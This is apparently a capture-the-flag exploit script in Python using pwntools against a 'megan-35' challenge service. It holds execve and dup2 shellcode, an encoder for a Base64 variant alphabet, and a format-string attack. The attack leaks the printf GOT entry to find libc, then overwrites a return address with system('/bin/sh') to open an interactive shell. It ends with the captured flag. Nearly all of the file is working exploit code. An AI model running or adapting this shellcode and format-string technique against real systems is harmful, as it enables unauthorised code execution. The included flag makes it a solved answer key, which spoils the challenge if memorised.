#!/usr/bin/python
# -*- coding: utf-8 -*-

from pwn import *

sc_execve32 = "\x31\xd2\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x52\x53\x89\xe1\x8d\x42\x0b\xcd\x80"
sc_execve64 = "\x48\x31\xd2\x48\xbb\x2f\x2f\x62\x69\x6e\x2f\x73\x68\x48\xc1\xeb\x08\x53\x48\x89\xe7\x50\x57\x48\x89\xe6\xb0\x3b\x0f\x05"
dup2_execve32 = "\x31\xd2\x31\xc9\x8d\x5a\x04\x8d\x42\x3f\xcd\x80\x41\x8d\x42\x3f\xcd\x80\x31\xd2\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x52\x53\x89\xe1\x8d\x42\x0b\xcd\x80"
dup2_execve64 = "\x31\xd2\x31\xf6\x67\x8d\x7a\x04\x67\x8d\x42\x21\x0f\x05\xff\xc6\x67\x8d\x42\x21\x0f\x05\x48\x31\xd2\x52\x48\xb8\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x50\x48\x89\xe7\x52\x57\x48\x89\xe6\x48\x8d\x42\x3b\x0f\x05"
#-----------START EXPLOIT CODE-----------#

megan35 = "3GHIJKLMNOPQRSTUb=cdefghijklmnopWXYZ/12+406789VaqrstuvwxyzABCDEF5"

class B64VariantEncoder:

    def __init__(self, translation):
        base = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/="
        self.lookup = dict(zip(base, translation))
        self.revlookup = dict(zip(translation, base))

    def encode(self, text):
        global lookup
        b64 = base64.b64encode(text)
        result = "".join([self.lookup[x] for x in b64])
        return result

    def decode(self, code):
        global revlookup
        b64 = "".join([self.revlookup[x] for x in code])
        result = base64.b64decode(b64)
        return result

def encode(variant, text):
    encoder = B64VariantEncoder(variant)
    return encoder.encode(text)

def decode(variant, code):
    try:
        encoder = B64VariantEncoder(variant)
        return encoder.decode(code)
    except KeyError:
        return "no valid encoding"
    except TypeError:
        return "no correct padding"

def leak(conn):
    conn.recv()
    
    payload = p32(got_printf)   #got printf 
    payload += "%71$s"
    payload += "0x%139$08x"
    conn.sendline(encode(megan35,payload))
    line = conn.recv()
    libc_base = u32(line[4:8]) - offset_printf
    ret_addr = int(line[24:34],16) -4
    return libc_base, ret_addr
    

elf = ELF('./libc.so.6')
pwn = ELF('./megan-35')

offset_system = elf.symbols['system']  #0x0003a940
offset_printf = elf.symbols['printf'] #0x00049020
offset_fflush = elf.symbols['fflush'] #0x0005d330

got_printf = pwn.got['printf'] #0x0804a00c
binsh = next(elf.search("/bin/sh"))

HOST = "megan35.stillhackinganyway.nl"
PORT = 3535
conn = None

if len(sys.argv) > 1 and sys.argv[1] == 'r':
    conn = remote(HOST, PORT)
else:
    conn = process('./megan-35')

libc_base, ret_addr = leak(conn)
print "libc_base: " + hex(libc_base)
print "ret_addr: " + hex(ret_addr)
conn = remote(HOST, PORT)
conn.recv()
payload = {
    ret_addr: libc_base + offset_system,
    ret_addr+8: libc_base + binsh
}
conn.sendline(encode(megan35,fmtstr_payload(71,payload)))
conn.interactive() 

#flag{43eb404b714b8d22e1168775eba1669c}
